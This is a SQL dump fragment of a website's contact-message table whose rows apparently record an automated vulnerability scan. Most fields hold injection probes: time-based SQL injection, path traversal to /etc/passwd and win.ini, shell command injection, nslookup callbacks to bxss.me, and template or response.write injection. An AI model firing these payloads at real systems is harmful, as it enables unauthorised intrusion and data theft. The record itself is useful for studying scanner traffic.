(119, 1679623888, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '@@yDWUh'),
(120, 1679623891, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'bxss.me', '555'),
(121, 1679623893, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(122, 1679623896, NULL, 'uFPKKsNb', 'sample@email.tst', '${9999409+9999399}', '555-666-0606', '1', '555'),
(123, 1679623899, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(124, 1679623902, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '${9999528+9999417}'),
(125, 1679623905, NULL, 'V5v9dkMR', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(126, 1679623908, NULL, '${10000348+9999128}', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(127, 1679623911, NULL, '-1 OR 2+560-560-1=0+0+0+1 -- ', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(128, 1679623914, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '${9999952+10000443}', '1', '555'),
(129, 1679623917, NULL, '-1 OR 2+771-771-1=0+0+0+1', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(130, 1679623920, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(131, 1679623922, NULL, '-1\' OR 2+447-447-1=0+0+0+1 -- ', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(132, 1679623925, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '${9999324+9999042}', '555'),
(133, 1679623928, NULL, '-1\' OR 2+309-309-1=0+0+0+1 or \'HhZTlZds\'=\'', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(134, 1679623931, NULL, 'uFPKKsNb', 'sample@email.tst', '', '555-666-0606', '1', '555'),
(135, 1679623934, NULL, '-1\" OR 2+797-797-1=0+0+0+1 -- ', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(136, 1679623939, NULL, 'if(now()=sysdate(),sleep(15),0)', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(137, 1679623942, NULL, 'uFPKKsNb', 'sample@email.tst', NULL, '555-666-0606', '1', '555'),
(138, 1679623945, NULL, '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(139, 1679623948, NULL, '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(140, 1679623955, NULL, '1 waitfor delay \'0:0:15\' -- ', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(141, 1679623958, NULL, '6Om4Awm7\'; waitfor delay \'0:0:15\' -- ', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(142, 1679623964, NULL, 'cnz9UmRy\' OR 647=(SELECT 647 FROM PG_SLEEP(15))--', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(143, 1679623967, NULL, 'Qoqw2XQf\') OR 417=(SELECT 417 FROM PG_SLEEP(15))--', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(144, 1679623970, NULL, '7lubioWE\')) OR 465=(SELECT 465 FROM PG_SLEEP(15))--', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(145, 1679623976, NULL, 'uFPKKsNb\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(146, 1679623978, NULL, '1\'\"', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(147, 1679623981, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '', '1', '555'),
(148, 1679623990, NULL, '@@W3GJS', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(149, 1679623993, NULL, 'uFPKKsNb', 'sample@email.tst', '555', NULL, '1', '555'),
(150, 1679623996, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(151, 1679623999, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(152, 1679624002, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(153, 1679624005, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(154, 1679624007, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'ucwuuxIt', '1', '555'),
(155, 1679624010, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '-1 OR 2+194-194-1=0+0+0+1 -- ', '1', '555'),
(156, 1679624013, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '-1 OR 2+457-457-1=0+0+0+1', '1', '555'),
(157, 1679624016, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(158, 1679624019, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '-1\' OR 2+168-168-1=0+0+0+1 -- ', '1', '555'),
(159, 1679624022, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '-1\' OR 2+164-164-1=0+0+0+1 or \'M6WFQlkD\'=\'', '1', '555'),
(160, 1679624027, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '-1\" OR 2+593-593-1=0+0+0+1 -- ', '1', '555'),
(161, 1679624030, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'if(now()=sysdate(),sleep(15),0)', '1', '555'),
(162, 1679624033, NULL, 'uFPKKsNb', 'sample@email.tst', '../../../../../../../../../../../../../../etc/passwd', '555-666-0606', '1', '555'),
(163, 1679624036, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '1', '555'),
(164, 1679624039, NULL, 'uFPKKsNb', 'sample@email.tst', '../../../../../../../../../../../../../../windows/win.ini', '555-666-0606', '1', '555'),
(165, 1679624042, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '1', '555'),
(166, 1679624045, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(167, 1679624051, NULL, 'uFPKKsNb', 'sample@email.tst', '../555', '555-666-0606', '1', '555'),
(168, 1679624054, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '1 waitfor delay \'0:0:15\' -- ', '1', '555'),
(169, 1679624058, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'ot4ImmTa\'; waitfor delay \'0:0:15\' -- ', '1', '555'),
(170, 1679624061, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'iroehIo8\' OR 913=(SELECT 913 FROM PG_SLEEP(15))--', '1', '555'),
(171, 1679624063, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(172, 1679624066, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'mDPDnYWz\') OR 193=(SELECT 193 FROM PG_SLEEP(15))--', '1', '555'),
(173, 1679624069, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '9LpatDhF\')) OR 719=(SELECT 719 FROM PG_SLEEP(15))--', '1', '555'),
(174, 1679624072, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '../../../../../../../../../../../../../../etc/passwd'),
(175, 1679624075, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '1', '555'),
(176, 1679624077, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '../../../../../../../../../../../../../../windows/win.ini'),
(177, 1679624080, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '1\'\"', '1', '555'),
(178, 1679624083, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(179, 1679624089, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '../555'),
(180, 1679624092, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '@@pVW98', '1', '555'),
(181, 1679624094, NULL, '../../../../../../../../../../../../../../etc/passwd', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(182, 1679624097, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(183, 1679624100, NULL, '../../../../../../../../../../../../../../windows/win.ini', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(184, 1679624103, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(185, 1679624106, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(186, 1679624109, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(187, 1679624112, NULL, '../uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(188, 1679624116, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(189, 1679624119, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '../../../../../../../../../../../../../../etc/passwd', '1', '555'),
(190, 1679624122, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(191, 1679624125, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '../../../../../../../../../../../../../../windows/win.ini', '1', '555'),
(192, 1679624128, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(193, 1679624131, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(194, 1679624133, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(195, 1679624136, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '../555-666-0606', '1', '555'),
(196, 1679624139, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(197, 1679624142, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(198, 1679624145, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(199, 1679624148, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(200, 1679624151, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(201, 1679624154, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(202, 1679624157, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(203, 1679624160, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(204, 1679624163, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(205, 1679624166, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(206, 1679624168, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(207, 1679624171, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(208, 1679624174, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(209, 1679624177, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '../../../../../../../../../../../../../../etc/passwd', '555'),
(210, 1679624180, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(211, 1679624183, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '../../../../../../../../../../../../../../windows/win.ini', '555'),
(212, 1679624186, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(213, 1679624189, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(214, 1679624192, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(215, 1679624195, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '../1', '555'),
(216, 1679624197, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(217, 1679624200, NULL, 'uFPKKsNb', 'sample@email.tst', 'echo qrzdlg$()\\ yihvlm\\nz^xyu||a #\' &echo qrzdlg$()\\ yihvlm\\nz^xyu||a #|\" &echo qrzdlg$()\\ yihvlm\\nz^xyu||a #', '555-666-0606', '1', '555'),
(218, 1679624203, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(219, 1679624206, NULL, 'uFPKKsNb', 'sample@email.tst', '&echo ajxbtj$()\\ lvwcio\\nz^xyu||a #\' &echo ajxbtj$()\\ lvwcio\\nz^xyu||a #|\" &echo ajxbtj$()\\ lvwcio\\nz^xyu||a #', '555-666-0606', '1', '555'),
(220, 1679624209, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(221, 1679624212, NULL, 'uFPKKsNb', 'sample@email.tst', '|echo wqojzr$()\\ gvlfzl\\nz^xyu||a #\' |echo wqojzr$()\\ gvlfzl\\nz^xyu||a #|\" |echo wqojzr$()\\ gvlfzl\\nz^xyu||a #', '555-666-0606', '1', '555'),
(222, 1679624215, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(223, 1679624217, NULL, 'uFPKKsNb', 'sample@email.tst', '(nslookup hithymuwgdfni1463c.bxss.me||perl -e \"gethostbyname(\'hithymuwgdfni1463c.bxss.me\')\")', '555-666-0606', '1', '555'),
(224, 1679624220, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(225, 1679624223, NULL, 'uFPKKsNb', 'sample@email.tst', '$(nslookup hithbrwkxqxcz25eae.bxss.me||perl -e \"gethostbyname(\'hithbrwkxqxcz25eae.bxss.me\')\")', '555-666-0606', '1', '555'),
(226, 1679624226, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(227, 1679624229, NULL, 'uFPKKsNb', 'sample@email.tst', '&(nslookup hitcrogukmxgz68cc4.bxss.me||perl -e \"gethostbyname(\'hitcrogukmxgz68cc4.bxss.me\')\")&\'\\\"`0&(nslookup hitcrogukmxgz68cc4.bxss.me||perl -e \"gethostbyname(\'hitcrogukmxgz68cc4.bxss.me\')\")&`\'', '555-666-0606', '1', '555'),
(228, 1679624232, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(229, 1679624235, NULL, 'uFPKKsNb', 'sample@email.tst', '|(nslookup hitaaptctbydkb5cfd.bxss.me||perl -e \"gethostbyname(\'hitaaptctbydkb5cfd.bxss.me\')\")', '555-666-0606', '1', '555'),
(230, 1679624238, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(231, 1679624241, NULL, 'uFPKKsNb', 'sample@email.tst', '`(nslookup hitqgagcfxtkt75559.bxss.me||perl -e \"gethostbyname(\'hitqgagcfxtkt75559.bxss.me\')\")`', '555-666-0606', '1', '555'),
(232, 1679624244, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(233, 1679624247, NULL, 'uFPKKsNb', 'sample@email.tst', ';(nslookup hitxxeybnfkbc7220d.bxss.me||perl -e \"gethostbyname(\'hitxxeybnfkbc7220d.bxss.me\')\")|(nslookup hitxxeybnfkbc7220d.bxss.me||perl -e \"gethostbyname(\'hitxxeybnfkbc7220d.bxss.me\')\")&(nslookup hitxxeybnfkbc7220d.bxss.me||perl -e \"gethostbyname(\'hitxxeybnfkbc7220d.bxss.me\')\")', '555-666-0606', '1', '555'),
(234, 1679624250, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(235, 1679624253, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(236, 1679624258, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'echo ckcjtq$()\\ nryfhg\\nz^xyu||a #\' &echo ckcjtq$()\\ nryfhg\\nz^xyu||a #|\" &echo ckcjtq$()\\ nryfhg\\nz^xyu||a #'),
(237, 1679624261, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '&echo mlqyqr$()\\ vxnudn\\nz^xyu||a #\' &echo mlqyqr$()\\ vxnudn\\nz^xyu||a #|\" &echo mlqyqr$()\\ vxnudn\\nz^xyu||a #'),
(238, 1679624263, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '|echo nplfme$()\\ kyqfqg\\nz^xyu||a #\' |echo nplfme$()\\ kyqfqg\\nz^xyu||a #|\" |echo nplfme$()\\ kyqfqg\\nz^xyu||a #'),
(239, 1679624266, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '(nslookup hitcbhpysqrzo87c97.bxss.me||perl -e \"gethostbyname(\'hitcbhpysqrzo87c97.bxss.me\')\")'),
(240, 1679624269, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '$(nslookup hitivfezpeczcf0750.bxss.me||perl -e \"gethostbyname(\'hitivfezpeczcf0750.bxss.me\')\")'),
(241, 1679624272, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(242, 1679624275, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '&(nslookup hityxovdhirzrf1ab6.bxss.me||perl -e \"gethostbyname(\'hityxovdhirzrf1ab6.bxss.me\')\")&\'\\\"`0&(nslookup hityxovdhirzrf1ab6.bxss.me||perl -e \"gethostbyname(\'hityxovdhirzrf1ab6.bxss.me\')\")&`\''),
(243, 1679624278, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '|(nslookup hitaydbczuvxfe3a3a.bxss.me||perl -e \"gethostbyname(\'hitaydbczuvxfe3a3a.bxss.me\')\")'),
(244, 1679624281, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(245, 1679624283, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '`(nslookup hitajnengebafb7c20.bxss.me||perl -e \"gethostbyname(\'hitajnengebafb7c20.bxss.me\')\")`'),
(246, 1679624286, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(247, 1679624289, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', ';(nslookup hitanhtyrmmzg74aa2.bxss.me||perl -e \"gethostbyname(\'hitanhtyrmmzg74aa2.bxss.me\')\")|(nslookup hitanhtyrmmzg74aa2.bxss.me||perl -e \"gethostbyname(\'hitanhtyrmmzg74aa2.bxss.me\')\")&(nslookup hitanhtyrmmzg74aa2.bxss.me||perl -e \"gethostbyname(\'hitanhtyrmmzg74aa2.bxss.me\')\")'),
(248, 1679624292, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'hxkv4n42', '555'),
(249, 1679624297, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1 OR 2+669-669-1=0+0+0+1 -- ', '555'),
(250, 1679624303, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1 OR 2+501-501-1=0+0+0+1', '555'),
(251, 1679624309, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1\' OR 2+497-497-1=0+0+0+1 -- ', '555'),
(252, 1679624312, NULL, '(nslookup hitvxxrcgmmtq899f0.bxss.me||perl -e \"gethostbyname(\'hitvxxrcgmmtq899f0.bxss.me\')\")', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(253, 1679624314, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1\' OR 2+445-445-1=0+0+0+1 or \'sBzdU7Ci\'=\'', '555'),
(254, 1679624317, NULL, '$(nslookup hitwkraypvxjpdb3c2.bxss.me||perl -e \"gethostbyname(\'hitwkraypvxjpdb3c2.bxss.me\')\")', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(255, 1679624320, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1\" OR 2+382-382-1=0+0+0+1 -- ', '555'),
(256, 1679624326, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'if(now()=sysdate(),sleep(15),0)', '555'),
(257, 1679624329, NULL, '|(nslookup hitzblgmdztkm744ff.bxss.me||perl -e \"gethostbyname(\'hitzblgmdztkm744ff.bxss.me\')\")', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(258, 1679624332, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '555'),
(259, 1679624335, NULL, '`(nslookup hitzodjhldgxeeb860.bxss.me||perl -e \"gethostbyname(\'hitzodjhldgxeeb860.bxss.me\')\")`', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(260, 1679624338, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '555');
INSERT INTO `pm_message` (`id`, `add_date`, `edit_date`, `name`, `email`, `address`, `phone`, `subject`, `msg`) VALUES
(261, 1679624344, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))v)+\"*/', '555'),
(262, 1679624350, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1; waitfor delay \'0:0:15\' -- ', '555'),
(263, 1679624355, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1); waitfor delay \'0:0:15\' -- ', '555'),
(264, 1679624361, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1 waitfor delay \'0:0:15\' -- ', '555'),
(265, 1679624364, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '(nslookup hitpdildbuejv0b80d.bxss.me||perl -e \"gethostbyname(\'hitpdildbuejv0b80d.bxss.me\')\")', '1', '555'),
(266, 1679624367, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '0nYUilsI\'; waitfor delay \'0:0:15\' -- ', '555'),
(267, 1679624370, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '$(nslookup hitepwrftyvka699fe.bxss.me||perl -e \"gethostbyname(\'hitepwrftyvka699fe.bxss.me\')\")', '1', '555'),
(268, 1679624372, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-5 OR 272=(SELECT 272 FROM PG_SLEEP(15))--', '555'),
(269, 1679624378, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-5) OR 950=(SELECT 950 FROM PG_SLEEP(15))--', '555'),
(270, 1679624381, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '|(nslookup hitraftxgzsyj4282c.bxss.me||perl -e \"gethostbyname(\'hitraftxgzsyj4282c.bxss.me\')\")', '1', '555'),
(271, 1679624383, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '-1)) OR 864=(SELECT 864 FROM PG_SLEEP(15))--', '555'),
(272, 1679624386, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '`(nslookup hitzzlrljdwrs397bb.bxss.me||perl -e \"gethostbyname(\'hitzzlrljdwrs397bb.bxss.me\')\")`', '1', '555'),
(273, 1679624390, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'uFGxuIe1\' OR 909=(SELECT 909 FROM PG_SLEEP(15))--', '555'),
(274, 1679624395, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'vr9qi7l9\') OR 935=(SELECT 935 FROM PG_SLEEP(15))--', '555'),
(275, 1679624398, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(276, 1679624401, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'f7igYWmj\')) OR 411=(SELECT 411 FROM PG_SLEEP(15))--', '555'),
(277, 1679624404, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(278, 1679624407, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),15)', '555'),
(279, 1679624410, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(280, 1679624413, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '555'),
(281, 1679624416, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(282, 1679624418, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1\'\"', '555'),
(283, 1679624421, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(284, 1679624427, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(285, 1679624430, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '@@sWefF', '555'),
(286, 1679624432, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(287, 1679624435, NULL, 'uFPKKsNb', 'sample@email.tst', 'response.write(9656008*9046628)', '555-666-0606', '1', '555'),
(288, 1679624438, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(289, 1679624441, NULL, 'uFPKKsNb', 'sample@email.tst', '\'+response.write(9656008*9046628)+\'', '555-666-0606', '1', '555'),
(290, 1679624444, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(291, 1679624447, NULL, 'uFPKKsNb', 'sample@email.tst', '\"+response.write(9656008*9046628)+\"', '555-666-0606', '1', '555'),
(292, 1679624450, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'response.write(9776833*9444934)'),
(293, 1679624453, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'+response.write(9776833*9444934)+\''),
(294, 1679624455, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\"+response.write(9776833*9444934)+\"'),
(295, 1679624458, NULL, 'response.write(9614003*9394277)', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(296, 1679624461, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'echo ygopkn$()\\ ofxust\\nz^xyu||a #\' &echo ygopkn$()\\ ofxust\\nz^xyu||a #|\" &echo ygopkn$()\\ ofxust\\nz^xyu||a #', '555'),
(297, 1679624464, NULL, '\'+response.write(9614003*9394277)+\'', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(298, 1679624467, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '&echo ucyxqh$()\\ qgftoj\\nz^xyu||a #\' &echo ucyxqh$()\\ qgftoj\\nz^xyu||a #|\" &echo ucyxqh$()\\ qgftoj\\nz^xyu||a #', '555'),
(299, 1679624469, NULL, '\"+response.write(9614003*9394277)+\"', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(300, 1679624473, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '|echo iujrfw$()\\ jyihni\\nz^xyu||a #\' |echo iujrfw$()\\ jyihni\\nz^xyu||a #|\" |echo iujrfw$()\\ jyihni\\nz^xyu||a #', '555'),
(301, 1679624476, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'response.write(9726392*9889802)', '1', '555'),
(302, 1679624479, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '(nslookup hitxkwkqlbhnf4d2d5.bxss.me||perl -e \"gethostbyname(\'hitxkwkqlbhnf4d2d5.bxss.me\')\")', '555'),
(303, 1679624482, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\'+response.write(9726392*9889802)+\'', '1', '555'),
(304, 1679624485, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '$(nslookup hituqzzceowua1ee05.bxss.me||perl -e \"gethostbyname(\'hituqzzceowua1ee05.bxss.me\')\")', '555'),
(305, 1679624487, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\"+response.write(9726392*9889802)+\"', '1', '555'),
(306, 1679624490, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '&(nslookup hitykuieztodia86f2.bxss.me||perl -e \"gethostbyname(\'hitykuieztodia86f2.bxss.me\')\")&\'\\\"`0&(nslookup hitykuieztodia86f2.bxss.me||perl -e \"gethostbyname(\'hitykuieztodia86f2.bxss.me\')\")&`\'', '555'),
(307, 1679624493, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(308, 1679624496, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '|(nslookup hitjetadkfcck156b3.bxss.me||perl -e \"gethostbyname(\'hitjetadkfcck156b3.bxss.me\')\")', '555'),
(309, 1679624499, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(310, 1679624502, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '`(nslookup hituucmyjigej263bf.bxss.me||perl -e \"gethostbyname(\'hituucmyjigej263bf.bxss.me\')\")`', '555'),
(311, 1679624505, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(312, 1679624511, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'response.write(9942428*9779051)', '555'),
(313, 1679624514, NULL, 'aElMSFdJTU0=', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
